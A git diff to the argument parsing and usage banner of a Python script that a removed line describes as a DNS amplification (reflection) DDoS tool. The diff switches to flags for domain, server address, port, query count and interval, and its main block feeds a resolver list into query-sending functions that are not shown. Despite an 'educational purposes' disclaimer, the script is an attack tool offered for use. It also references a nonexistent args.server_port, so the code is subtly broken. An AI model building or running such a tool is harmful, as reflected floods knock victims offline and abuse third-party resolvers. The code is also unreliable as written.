@@ -71,38 +71,37 @@ def display_banner():
 █   █ █▄   ▄▀   █     █▄   ▄▀ ▀████ █  █  █  █ ▐█ █ █  █ 
    █  ▀███▀    ▀      ▀███▀           █      █  ▐ █  █ █ 
   ▀                                  ▀      █     █   ██ 
-                                           ▀  Author: r3vskd           
+                                           ▀  Author: r3vskd
+                                              Warning: It was created for educational purposes. Please don't misuse it for illegal activities.         
 ''')
-    print("Script to perform DDoS using DNS amplification (reflection) technique.")
-    print("It was created for educational purposes. Please don't misuse it for illegal activities.")
     print("Usage:")
-    print(" python ./poc2.py -f resolvers.txt <domain> <server_address> <server_port> <num_queries> <interval> [-v/--verbose]\n")
+    print(" $python ./poc2.py -f resolvers.txt <domain> <server_address> <server_port> <num_queries> <interval>\n")
     print("Options:")
-    print("  domain            Domain name to query")
-    print("  -f                DNS Resolvers txt file")
-    print("  server_address    DNS server address")
-    print("  -p or --port      DNS server port")
-    print("  num_queries       Number of queries to send")
-    print("  interval          Interval between queries in seconds")
-    print("  -v or --verbose   Enable verbose mode (optional)\n")
+    print("  -f or --file             DNS Resolvers txt file")
+    print("  -d or --domain           Set the domain name to query")
+    print("  -s or --server_address   Set the dns server address")
+    print("  -p or --port             Set the server port")
+    print("  -q or --num_queries      Set the number of queries to send (Default: 1)")
+    print("  -i or --interval         Set the interval between queries in seconds (Default: 1 second)")
+    print("  -v or --verbose          Enable verbose mode (optional)\n")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='DNS query sender')
-    parser.add_argument('domain', nargs='?', type=str, help='Domain name to query')
+    parser.add_argument('-d', '--domain', type=str, help='Domain name to query')
     parser.add_argument('-f', '--file', type=str, help='Path to the file containging DNS resolver addresses')
-    parser.add_argument('server_address', nargs='?', type=str, help='DNS server address')
+    parser.add_argument('-s', '--server_address', type=str, help='DNS server address')
     parser.add_argument('-p', '--port', type=int, help='DNS server port')
-    parser.add_argument('num_queries', nargs='?', type=int, help='Number of queries to send')
-    parser.add_argument('interval', nargs='?', type=float, help='Interval between queries in seconds')
+    parser.add_argument('-q', '--num_queries', nargs='?', const=1, type=int, help='Number of queries to send')
+    parser.add_argument('-i', '--interval', nargs='?', const=1.0, type=float, help='Interval between queries in seconds')
     parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
 
     args = parser.parse_args()
 
     if not any(vars(args).values()):
         display_banner()
-    elif args.file and args.port:
+    elif args.file and args.port and args.domain and args.server_address and args.num_queries and args.interval:
         resolvers=get_resolvers_from_file(args.file)
         send_queries_through_resolvers(args.domain, resolvers, args.port, args.num_queries, args.interval, args.verbose)
         send_multiple_queries(args.domain, args.server_address, args.server_port, args.num_queries, args.interval, args.verbose)
     else:
-         print("Please provide a file containing DNS resolver addresses using -f/--file and specify the DNS server port using -p/--port.")
+         print("Please provide a file containing DNS resolver addresses using -f/--file, specify the DNS server port using -p/--port, the domain using -d/--domain, and the server address using -s/--server_address.")
